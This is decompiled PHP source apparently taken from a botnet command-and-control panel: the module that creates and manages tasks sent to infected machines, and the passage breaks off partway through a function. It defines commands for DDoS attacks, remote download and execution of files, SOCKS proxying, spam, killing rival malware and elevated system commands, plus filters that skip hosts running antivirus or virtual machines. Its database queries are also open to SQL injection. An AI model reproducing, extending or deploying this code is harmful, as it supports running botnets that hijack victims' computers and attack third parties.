<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

if (!defined("IN_CORE_INC")) {
    exit("..");
}
define("COMMAND_GENERAL_SWITCH_SILENT", "s");
define("COMMAND_DDOS_SWITCH_RANDOM_DATA", "r");
define("COMMAND_DDOS_SWITCH_STOP", "S");
define("COMMAND_STRING_DDOS", "ddos");
define("COMMAND_FORMAT_DDOS", ".%s -%s %s %u %u %u %s");
define("COMMAND_DOWNLOAD_SWITCH_HIDE_WINDOW", "h");
define("COMMAND_DOWNLOAD_SWITCH_AUTO_REMOVE", "c");
define("COMMAND_DOWNLOAD_SWITCH_EXECUTE", "e");
define("COMMAND_DOWNLOAD_SWITCH_RANDOM_WAIT", "d");
define("COMMAND_DOWNLOAD_SWITCH_SANDBOX", "S");
define("COMMAND_DOWNLOAD_SWITCH_NO_PROACTIVE", "n");
define("COMMAND_DOWNLOAD_SWITCH_IS_DLL_FILE", "L");
define("COMMAND_DOWNLOAD_SWITCH_IS_JAR_FILE", "J");
define("COMMAND_DOWNLOAD_SWITCH_IS_CPL_FILE", "C");
define("COMMAND_DOWNLOAD_SWITCH_UPDATE_HASH_CHECK", "H");
define("COMMAND_DOWNLOAD_SWITCH_UPDATE_IS_SAME_BOT", "X");
define("COMMAND_DOWNLOAD_SWITCH_UPDATE_REVERT_TO_STANDARD", "r");
define("COMMAND_DOWNLOAD_SWITCH_DECRYPT", "D");
define("COMMAND_DOWNLOAD_SWITCH_USE_RUNDLL", "R");
define("COMMAND_DOWNLOAD_SWITCH_USE_CACHE_WRITE", "W");
define("COMMAND_STRING_DOWNLOAD", "dwfile");
define("COMMAND_STRING_UPDATE", "update");
define("COMMAND_FORMAT_DOWNLOAD", ".%s -%s %s");
define("COMMAND_BROWSER_VISIT_SWITCH_HIDE_WINDOW", "h");
define("COMMAND_BROWSER_SWITCH_CLEARCACHE", "C");
define("COMMAND_STRING_BROWSER_VISIT", "browser.visit");
define("COMMAND_STRING_BROWSER_HOMEPAGE", "browser.sethome");
define("COMMAND_STRING_BROWSER_CLEARCACHE", "browser");
define("COMMAND_FORMAT_BROWSER2", ".%s -%s");
define("COMMAND_FORMAT_BROWSER", ".%s -%s %s");
define("COMMAND_STRING_PLUGIN_COMMAND", "plugin");
define("COMMAND_FORMAT_PLUGIN_COMMAND", ".%s -%s %s");
define("COMMAND_BOTSCRIPT_SWITCH_PROCESS_USE_EXPLORER", "E");
define("COMMAND_BOTSCRIPT_SWITCH_PROCESS_USE_MSIEXEC", "M");
define("COMMAND_BOTSCRIPT_SWITCH_PROCESS_USE_SVCHOST", "S");
define("COMMAND_BOTSCRIPT_SWITCH_PROCESS_MUST_USE_OVERRIDE", "m");
define("COMMAND_BOTSCRIPT_SWITCH_NO_ALERTS", "v");
define("COMMAND_BOTSCRIPT_SWITCH_NO_BOT_INTERFACE", "i");
define("COMMAND_BOTSCRIPT_SWITCH_SCRIPT_IS_INLINE", "I");
define("COMMAND_BOTSCRIPT_SWITCH_EXECUTE_NO_MATTER_WHAT", "A");
define("COMMAND_STRING_BOTSCRIPT", "botscript");
define("COMMAND_FORMAT_BOTSCRIPT", ".%s -%s %s");
define("COMMAND_BOTKILL_SWITCH_MINERS", "m");
define("COMMAND_BOTKILL_SWITCH_INJECT", "i");
define("COMMAND_BOTKILL_SWITCH_SCRIPTS", "S");
define("COMMAND_BOTKILL_SWITCH_BHOS", "B");
define("COMMAND_BOTKILL_SWITCH_IGNORE_IF_PARENT", "P");
define("COMMAND_BOTKILL_SWITCH_IGNORE_LOADERS", "A");
define("COMMAND_BOTKILL_SWITCH_KILL_TASKS", "T");
define("COMMAND_STRING_BOTKILL", "botkill");
define("COMMAND_FORMAT_BOTKILL", ".%s -%s");
define("COMMAND_SOCKS_SWITCH_STOP", "S");
define("COMMAND_SOCKS_SWITCH_RANDOM_PORT", "r");
define("COMMAND_STRING_SOCKS", "socks");
define("COMMAND_FORMAT_SOCKS", ".%s -%s %u %u %s");
define("COMMAND_SPAM_SWITCH_ONLY_IDLE", "i");
define("COMMAND_STRING_SPAM", "spam");
define("COMMAND_FORMAT_SPAM", ".%s -%s %s");
define("COMMAND_STRING_TERMINATE", "die");
define("COMMAND_FORMAT_TERMINATE", ".%s -%s");
define("COMMAND_STRING_UNINSTALL", "rem");
define("COMMAND_FORMAT_UNINSTALL", ".%s -%s");
define("COMMAND_SYSTEM_SWITCH_RUN_ELEVATED", "e");
define("COMMAND_STRING_SYSTEM", "sys");
define("COMMAND_FORMAT_SYSTEM", ".%s -%s %s");
define("TASK_GENERAL_OPTION_32BIT", 8);
define("TASK_GENERAL_OPTION_64BIT", 16);
define("TASK_GENERAL_OPTION_NO_ANTIVIRUS", 32);
define("TASK_GENERAL_OPTION_NEW_CLIENT_ONLY", 64);
define("TASK_GENERAL_OPTION_ALL_BUT_COUNTRIES", 128);
define("TASK_GENERAL_OPTION_ALL_BUT_GUIDS", 256);
define("TASK_GENERAL_OPTION_ALL_BUT_IPS", 512);
define("TASK_GENERAL_OPTION_ALL_BUT_GROUPS", 1024);
define("TASK_GENERAL_OPTION_MARK_AS_DIRTY", 2048);
define("TASK_GENERAL_OPTION_IGNORE_IF_DIRTY", 4096);
define("TASK_GENERAL_OPTION_ONLY_FAVORITES", 8192);
define("TASK_GENERAL_OPTION_OLD_CLIENT_ONLY", 16384);
define("TASK_GENERAL_OPTION_APPLY_IF_DIRTY", 32768);
define("TASK_GENERAL_OPTION_NO_FAVORITES", 65536);
define("TASK_GENERAL_OPTION_OLD6H_CLIENT_ONLY", 131072);
define("TASK_GENERAL_OPTION_NO_VIRTUAL_MACHINE", 262144);
define("TASK_STATUS_SUSPENDED", 0);
define("TASK_STATUS_ACTIVE", 1);
define("TASK_STATUS_FINISHED", 2);
define("TASK_COMPLETION_STATUS_SUCCESS", 0);
define("TASK_COMPLETION_STATUS_SUCCESS_WARNING", 1);
define("TASK_COMPLETION_STATUS_ERROR", 2);
define("TASK_COMPLETION_FLAG_CHECK_MESSAGE", 16);
define("TASK_FILTER_OS_ALL", 0);
define("TASK_FILTER_ATTRIB_ALL", 0);
define("TASK_FILTER_SOFTWARE_ALL", 0);
define("TASK_FILTER_GENERAL_OPTIONS_ALL", 0);
define("TASK_TYPE_UNKNOWN", 0);
define("TASK_TYPE_DDOS", 1);
define("TASK_TYPE_DOWNLOAD", 2);
define("TASK_TYPE_UPLOAD", 3);
define("TASK_TYPE_UPDATE", 4);
define("TASK_TYPE_BROWSER_VISIT", 5);
define("TASK_TYPE_BROWSER_HOMEPAGE", 6);
define("TASK_TYPE_SYSTEM", 7);
define("TASK_TYPE_SOCKS", 8);
define("TASK_TYPE_BOTKILL", 9);
define("TASK_TYPE_SPAM", 10);
define("TASK_TYPE_TERMINATE", 11);
define("TASK_TYPE_UNINSTALL", 12);
define("TASK_TYPE_BROWSER_CLEARCACHE", 13);
define("TASK_TYPE_PLUGIN_COMMAND", 14);
define("TASK_TYPE_SYSTEM_COMMAND", 15);
define("TASK_TYPE_BOTSCRIPT_COMMAND", 16);
define("TASK_TYPE_MAX_0", 16);
$_TASK_TYPE_STRINGS = array("Unknown", "DDoS Attack", "Download / Execute", "Upload file", "Download / Update bot", "Browser / Visit link", "Browser / Set homepage", "System action", "Socks4 Server Action", "Botkill operation", "Spam / Skype", "Bot / Terminate", "Bot / Uninstall", "Browser / Clear cookies", "Plugin Command", "System command", "BotScript execution");
$_TASK_TYPE_LIST_STRINGS = array("unknown", "ddos", "dw", "up", "dw/update", "browse/visit", "browse/homepage", "sys", "socks", "botkill", "spam", "die", "rem", "browse/clearcache", "plugin", "sys", "botscript");
class CTasks extends CSqlWrap
{
    public function HashTaskCommandString($task_cmd_string)
    {
        $_obfuscated_0D140507301D28363136053038375C2D263E3E072D0E01_ = sha1($task_cmd_string . ":" . SQL_PASSWORD_SALT . ":" . strlen($task_cmd_string));
        return $_obfuscated_0D140507301D28363136053038375C2D263E3E072D0E01_;
    }
    public function CheckIfTbIdExists($tb_id_chk = 0)
    {
        $query = parent::Query("SELECT id FROM " . $this->pdbname . ".tasks WHERE tb_id = '" . $tb_id_chk . "'");
        if ($query && @mysql_num_rows($query) === 0) {
            return false;
        }
        return true;
    }
    public function AddTask($task_name, $task_owner, $task_command_data, $task_command_extended_data, $task_max_bots, $task_expiration_date, $task_status, $task_simple_type, $task_general_filter_flags, $task_filter_flags, $task_filter_os, $task_filter_countries, $task_filter_groups, $task_filter_software, $task_filter_hosts, $task_filter_guids)
    {
        if (strlen($task_name) == 0 || strlen($task_command_data) < 2 || $task_expiration_date == 0) {
            return NULL;
        }
        $_obfuscated_0D372A383B3C2904320522105C5C363F10243B09133E22_ = $this->HashTaskCommandString($task_command_data);
        $_obfuscated_0D3D3E2412131C270D091F01173D353C01351705052732_ = $task_owner;
        $_obfuscated_0D0F2939342F36392C02362B06265C242A17382F331632_ = $task_command_data;
        $task_name = bin2hex($task_name);
        $task_owner = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($task_owner);
        $task_owner = bin2hex($task_owner);
        $task_command_data = bin2hex($task_command_data);
        $task_command_extended_data = bin2hex($task_command_extended_data);
        $task_filter_countries = bin2hex($task_filter_countries);
        if ((int) $task_max_bots == 0) {
            global $main_sql_link;
            $_obfuscated_0D0D2E2C2324100F3F0A29191D1B2E1F10151139021132_ = new CClient();
            $_obfuscated_0D0D2E2C2324100F3F0A29191D1B2E1F10151139021132_->SetInternalLink($main_sql_link);
            $task_max_bots = (int) $_obfuscated_0D0D2E2C2324100F3F0A29191D1B2E1F10151139021132_->Stats_GetTotalBots();
            if ($task_max_bots == 0) {
                $task_max_bots = 1;
            }
        }
        $_obfuscated_0D13091D361D3F5B220B2E391631262B11035C265B0201_ = sprintf("%u", $task_filter_software);
        $task_filter_hosts = bin2hex($task_filter_hosts);
        $task_filter_guids = bin2hex($task_filter_guids);
        $task_filter_groups = bin2hex($task_filter_groups);
        $_obfuscated_0D143340303534381A281C05372834231E3B0C35153B22_ = sprintf("%u", $task_general_filter_flags);
        $_obfuscated_0D062A132D1209220903092611062D19283C3905022701_ = sprintf("%u", $task_filter_flags);
        $_obfuscated_0D330C0102342C3D14320A1B221A3527262C39313C2111_ = 0;
        for ($i = 0; $i < 6; $i++) {
            $_obfuscated_0D0C32050823061230401E300D3532073C3007401A3B01_ = -2147483649.0;
            if (mt_getrandmax() < $_obfuscated_0D0C32050823061230401E300D3532073C3007401A3B01_) {
                $_obfuscated_0D0C32050823061230401E300D3532073C3007401A3B01_ = mt_getrandmax();
            }
            $_obfuscated_0D330C0102342C3D14320A1B221A3527262C39313C2111_ = mt_rand(1, $_obfuscated_0D0C32050823061230401E300D3532073C3007401A3B01_);
            if ($this->CheckIfTbIdExists($_obfuscated_0D330C0102342C3D14320A1B221A3527262C39313C2111_) == false) {
                break;
            }
        }
        $_obfuscated_0D2A272A35373D2B5C1D17290F1640042F1F112D011811_ = sprintf("%u", $_obfuscated_0D330C0102342C3D14320A1B221A3527262C39313C2111_);
        $_obfuscated_0D2A340D191F3D1B1B1A02020E1E0C1A173230373E3301_ = parent::Query("INSERT INTO " . $this->pdbname . ".tasks VALUES(NULL, '" . $_obfuscated_0D2A272A35373D2B5C1D17290F1640042F1F112D011811_ . "', UNHEX('" . $task_name . "'), UNHEX('" . $task_owner . "'), '" . $_obfuscated_0D372A383B3C2904320522105C5C363F10243B09133E22_ . "', UNHEX('" . $task_command_data . "'), UNHEX('" . $task_command_extended_data . "'), '" . $task_max_bots . "', '0', '0', '" . $_obfuscated_0D143340303534381A281C05372834231E3B0C35153B22_ . "', '" . $_obfuscated_0D062A132D1209220903092611062D19283C3905022701_ . "', '" . $task_filter_os . "', '" . $_obfuscated_0D13091D361D3F5B220B2E391631262B11035C265B0201_ . "', UNHEX('" . $task_filter_hosts . "'), UNHEX('" . $task_filter_guids . "'), UNHEX('" . $task_filter_countries . "'), UNHEX('" . $task_filter_groups . "'), '" . $task_status . "', '" . $task_simple_type . "', '" . $task_expiration_date . "', UNIX_TIMESTAMP(NOW()))");
        if (!mysql_errno()) {
            global $main_sql_link;
            global $sqlSettings;
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_ = new CLogs();
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->SetInternalLink($main_sql_link);
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->AddEvent($_obfuscated_0D3D3E2412131C270D091F01173D353C01351705052732_, EVENT_TYPE_NEW_TASK, $_obfuscated_0D0F2939342F36392C02362B06265C242A17382F331632_);
            $sqlSettings->Update_LastTasksHashEx();
        } else {
            echo "MYSQL Err: &nbsp" . mysql_error() . "<br />\r\n";
        }
        return $_obfuscated_0D2A340D191F3D1B1B1A02020E1E0C1A173230373E3301_;
    }
    public function EditTask($pp_task_id, $task_name, $task_command_data, $task_command_extended_data, $task_max_bots, $task_expiration_date, $task_status, $task_simple_type, $task_general_filter_flags, $task_filter_flags, $task_filter_os, $task_filter_countries, $task_filter_groups, $task_filter_software, $task_filter_hosts, $task_filter_guids)
    {
        if (strlen($task_name) == 0 || strlen($task_command_data) < 2 || $task_expiration_date == 0) {
            return NULL;
        }
        if ($_obfuscated_0D1B10351805183C16383426280D1C3E08101F01241001_ = $this->GetTask($pp_task_id)) {
            $_obfuscated_0D372A383B3C2904320522105C5C363F10243B09133E22_ = $this->HashTaskCommandString($task_command_data);
            $_obfuscated_0D0F2939342F36392C02362B06265C242A17382F331632_ = $task_command_data;
            $task_name = bin2hex($task_name);
            $task_command_data = bin2hex($task_command_data);
            $task_command_extended_data = bin2hex($task_command_extended_data);
            $task_filter_countries = bin2hex($task_filter_countries);
            $_obfuscated_0D281B082E1A0F1E1A0B5B35230E06120A370D2B181611_ = $_obfuscated_0D1B10351805183C16383426280D1C3E08101F01241001_["bots_executed"];
            $_obfuscated_0D1A3B39362C230C17182318220C153C5C0B2F2F363611_ = $_obfuscated_0D1B10351805183C16383426280D1C3E08101F01241001_["creation_date"];
            if ((int) $task_max_bots == 0) {
                global $main_sql_link;
                $_obfuscated_0D0D2E2C2324100F3F0A29191D1B2E1F10151139021132_ = new CClient();
                $_obfuscated_0D0D2E2C2324100F3F0A29191D1B2E1F10151139021132_->SetInternalLink($main_sql_link);
                $task_max_bots = (int) $_obfuscated_0D0D2E2C2324100F3F0A29191D1B2E1F10151139021132_->Stats_GetTotalBots();
                if ($task_max_bots == 0) {
                    $task_max_bots = 1;
                }
            }
            $_obfuscated_0D13091D361D3F5B220B2E391631262B11035C265B0201_ = sprintf("%u", $task_filter_software);
            $task_filter_hosts = bin2hex($task_filter_hosts);
            $task_filter_guids = bin2hex($task_filter_guids);
            $task_filter_groups = bin2hex($task_filter_groups);
            $_obfuscated_0D143340303534381A281C05372834231E3B0C35153B22_ = sprintf("%u", $task_general_filter_flags);
            $_obfuscated_0D062A132D1209220903092611062D19283C3905022701_ = sprintf("%u", $task_filter_flags);
            $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("UPDATE " . $this->pdbname . ".tasks SET name=UNHEX('" . $task_name . "'), cmd_hash='" . $_obfuscated_0D372A383B3C2904320522105C5C363F10243B09133E22_ . "', command=UNHEX('" . $task_command_data . "'), extended_command=UNHEX('" . $task_command_extended_data . "'), max_bots='" . $task_max_bots . "', bots_executed='" . $_obfuscated_0D281B082E1A0F1E1A0B5B35230E06120A370D2B181611_ . "', target_general_flags='" . $_obfuscated_0D143340303534381A281C05372834231E3B0C35153B22_ . "', target_flags='" . $_obfuscated_0D062A132D1209220903092611062D19283C3905022701_ . "', target_os='" . $task_filter_os . "', target_software='" . $_obfuscated_0D13091D361D3F5B220B2E391631262B11035C265B0201_ . "', target_hosts=UNHEX('" . $task_filter_hosts . "'), target_guids=UNHEX('" . $task_filter_guids . "'), target_locales=UNHEX('" . $task_filter_countries . "'), target_groups=UNHEX('" . $task_filter_groups . "'), status='" . $task_status . "', task_type='" . $task_simple_type . "', expiration_date='" . $task_expiration_date . "', creation_date='" . $_obfuscated_0D1A3B39362C230C17182318220C153C5C0B2F2F363611_ . "' WHERE id = '" . $pp_task_id . "' LIMIT 1");
            if ($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_) {
                global $sqlSettings;
                global $main_sql_link;
                global $Session;
                $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_ = new CLogs();
                $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->SetInternalLink($main_sql_link);
                $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_TASK_EDIT, "(Task #" . $pp_task_id . ") " . $_obfuscated_0D0F2939342F36392C02362B06265C242A17382F331632_);
                $sqlSettings->Update_LastTasksHashEx();
            }
            return $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_;
        }
    }
    public function GetCountAndFreeResult($query_res = NULL)
    {
        $_obfuscated_0D1324151122093E230B020A2A162B360F1B2615340A32_ = 0;
        if ($query_res) {
            list($_obfuscated_0D1324151122093E230B020A2A162B360F1B2615340A32_) = @mysql_fetch_row($query_res);
            @mysql_free_result($query_res);
        }
        return $_obfuscated_0D1324151122093E230B020A2A162B360F1B2615340A32_;
    }
    public function GetTask($task_id)
    {
        return @mysql_fetch_assoc(@parent::Query("SELECT * FROM " . $this->pdbname . ".tasks WHERE id = '" . $task_id . "' LIMIT 1"));
    }
    public function GetTasks()
    {
        return parent::Query("SELECT * FROM " . $this->pdbname . ".tasks ORDER BY status DESC");
    }
    public function GetActiveTasksCount()
    {
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".tasks WHERE status = '" . TASK_STATUS_ACTIVE . "'");
        return $this->GetCountAndFreeResult($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
    }
    public function GetActiveTasks()
    {
        return parent::Query("SELECT * FROM " . $this->pdbname . ".tasks WHERE status = '" . TASK_STATUS_ACTIVE . "' ORDER BY creation_date ASC");
    }
    public function SuspendTaskByName($task_name)
    {
        global $Session;
        $_obfuscated_0D3E12342D3D371D132D36281D2B062B0B181F04381701_ = isset($Session) ? $Session->Get(SESSION_INFO_USERNAME) : "";
        if ($task_name == "") {
            return NULL;
        }
        if ($_obfuscated_0D3E12342D3D371D132D36281D2B062B0B181F04381701_ == "") {
            $_obfuscated_0D3E12342D3D371D132D36281D2B062B0B181F04381701_ = "N/A";
        }
        $_obfuscated_0D012B0C08060D042D3002333F2F2926070E0F212F5B32_ = $task_name;
        $task_name = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($task_name);
        $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ = parent::Query("UPDATE " . $this->pdbname . ".tasks SET status='" . TASK_STATUS_SUSPENDED . "' WHERE name = '" . $task_name . "' LIMIT 1");
        if ($_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ && 1 <= mysql_affected_rows()) {
            global $sqlSettings;
            global $main_sql_link;
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_ = new CLogs();
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->SetInternalLink($main_sql_link);
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->AddEvent($_obfuscated_0D3E12342D3D371D132D36281D2B062B0B181F04381701_, EVENT_TYPE_TASK_EDIT, "Task <i>" . htmlspecialchars($_obfuscated_0D012B0C08060D042D3002333F2F2926070E0F212F5B32_) . "</i> suspended");
        }
        return $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_;
    }
    public function SuspendTask($task_id)
    {
        $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ = parent::Query("UPDATE " . $this->pdbname . ".tasks SET status='" . TASK_STATUS_SUSPENDED . "' WHERE id = '" . $task_id . "' LIMIT 1");
        if ($_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_) {
            global $sqlSettings;
            global $main_sql_link;
            global $Session;
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_ = new CLogs();
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->SetInternalLink($main_sql_link);
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_TASK_EDIT, "Task #" . $task_id . " suspended");
        }
        return $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_;
    }
    public function ResumeTaskByName($task_name)
    {
        global $Session;
        $_obfuscated_0D3E12342D3D371D132D36281D2B062B0B181F04381701_ = isset($Session) ? $Session->Get(SESSION_INFO_USERNAME) : "";
        if ($task_name == "") {
            return NULL;
        }
        if ($_obfuscated_0D3E12342D3D371D132D36281D2B062B0B181F04381701_ == "") {
            $_obfuscated_0D3E12342D3D371D132D36281D2B062B0B181F04381701_ = "N/A";
        }
        $_obfuscated_0D012B0C08060D042D3002333F2F2926070E0F212F5B32_ = $task_name;
        $task_name = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($task_name);
        $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ = parent::Query("UPDATE " . $this->pdbname . ".tasks SET status='" . TASK_STATUS_ACTIVE . "' WHERE name = '" . $task_name . "' LIMIT 1");
        if ($_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ && 1 <= mysql_affected_rows()) {
            global $sqlSettings;
            global $main_sql_link;
            $sqlSettings->Update_LastTasksHashEx();
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_ = new CLogs();
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->SetInternalLink($main_sql_link);
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->AddEvent($_obfuscated_0D3E12342D3D371D132D36281D2B062B0B181F04381701_, EVENT_TYPE_TASK_EDIT, "Task <i>" . htmlspecialchars($_obfuscated_0D012B0C08060D042D3002333F2F2926070E0F212F5B32_) . "</i> resumed");
        }
        return $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_;
    }
    public function ResumeTask($task_id)
    {
        $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ = parent::Query("UPDATE " . $this->pdbname . ".tasks SET status='" . TASK_STATUS_ACTIVE . "' WHERE id = '" . $task_id . "' LIMIT 1");
        if ($_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_) {
            global $sqlSettings;
            global $main_sql_link;
            global $Session;
            $sqlSettings->Update_LastTasksHashEx();
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_ = new CLogs();
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->SetInternalLink($main_sql_link);
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_TASK_EDIT, "Task #" . $task_id . " resumed");
        }
        return $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_;
    }
    public function DeleteTaskByName($task_name)
    {
        global $Session;
        $task_id = 0;
        $_obfuscated_0D3E12342D3D371D132D36281D2B062B0B181F04381701_ = isset($Session) ? $Session->Get(SESSION_INFO_USERNAME) : "";
        $row = NULL;
        if ($task_name == "") {
            return NULL;
        }
        if ($_obfuscated_0D3E12342D3D371D132D36281D2B062B0B181F04381701_ == "") {
            $_obfuscated_0D3E12342D3D371D132D36281D2B062B0B181F04381701_ = "N/A";
        }
        $task_name = _obfuscated_0D351439222D033C17131606071C320A393B0C3F361711_($task_name);
        $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ = parent::Query("SELECT id FROM " . $this->pdbname . ".tasks WHERE name = '" . $task_name . "' LIMIT 1");
        if ($_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ && ($row = mysql_fetch_assoc($_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_)) && isset($row["id"])) {
            $task_id = (int) $row["id"];
            $this->ClearTaskCompletionRecords($task_id);
            $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ = parent::Query("DELETE FROM " . $this->pdbname . ".tasks WHERE id = '" . $task_id . "' LIMIT 1");
            if ($_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ && 1 <= mysql_affected_rows()) {
                global $sqlSettings;
                global $main_sql_link;
                $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_ = new CLogs();
                $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->SetInternalLink($main_sql_link);
                $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->AddEvent($_obfuscated_0D3E12342D3D371D132D36281D2B062B0B181F04381701_, EVENT_TYPE_TASK_DELETE, "Task #" . $task_id . " deleted");
            }
            return $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_;
        }
    }
    public function DeleteTask($task_id)
    {
        $this->ClearTaskCompletionRecords($task_id);
        $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ = parent::Query("DELETE FROM " . $this->pdbname . ".tasks WHERE id = '" . $task_id . "' LIMIT 1");
        if ($_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_) {
            global $sqlSettings;
            global $main_sql_link;
            global $Session;
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_ = new CLogs();
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->SetInternalLink($main_sql_link);
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_TASK_DELETE, "Task #" . $task_id . " deleted");
        }
        return $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_;
    }
    public function SetTaskFinished($task_id)
    {
        return parent::Query("UPDATE " . $this->pdbname . ".tasks SET status='" . TASK_STATUS_FINISHED . "' WHERE id = '" . $task_id . "' LIMIT 1");
    }
    public function ClearAll()
    {
        $this->ClearAllTaskCompletionRecords();
        $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ = parent::Query("TRUNCATE TABLE " . $this->pdbname . ".tasks");
        if ($_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_) {
            global $sqlSettings;
            global $main_sql_link;
            global $Session;
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_ = new CLogs();
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->SetInternalLink($main_sql_link);
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_TASK_DELETE, "All tasks deleted");
        }
        return $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_;
    }
    public function ClearFinishedTasks()
    {
        $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ = parent::Query("DELETE FROM " . $this->pdbname . ".tasks WHERE status = '" . TASK_STATUS_FINISHED . "'");
        if ($_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_) {
            global $sqlSettings;
            global $main_sql_link;
            global $Session;
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_ = new CLogs();
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->SetInternalLink($main_sql_link);
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_TASK_DELETE, "All tasks deleted");
        }
        return parent::Query("DELETE FROM " . $this->pdbname . ".tasks_completed WHERE " . $this->pdbname . ".tasks_completed.task_id <> ALL(SELECT " . $this->pdbname . ".tasks.id FROM `" . $this->pdbname . ".tasks`)");
    }
    public function SuspendActiveTasks()
    {
        $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ = parent::Query("UPDATE " . $this->pdbname . ".tasks SET status='" . TASK_STATUS_SUSPENDED . "' WHERE status='" . TASK_STATUS_ACTIVE . "'");
        if ($_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_) {
            global $sqlSettings;
            global $main_sql_link;
            global $Session;
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_ = new CLogs();
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->SetInternalLink($main_sql_link);
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_TASK_EDIT, "All active tasks suspended");
        }
        return $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_;
    }
    public function ClearExpiredTasks()
    {
        $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ = parent::Query("DELETE FROM " . $this->pdbname . ".tasks WHERE UNIX_TIMESTAMP(NOW()) >= expiration_date");
        if ($_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_) {
            global $sqlSettings;
            global $main_sql_link;
            global $Session;
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_ = new CLogs();
            $_obfuscated_0D5C2308161D1F2F292936292B01033735140E1A402401_->SetInternalLink($main_sql_link);
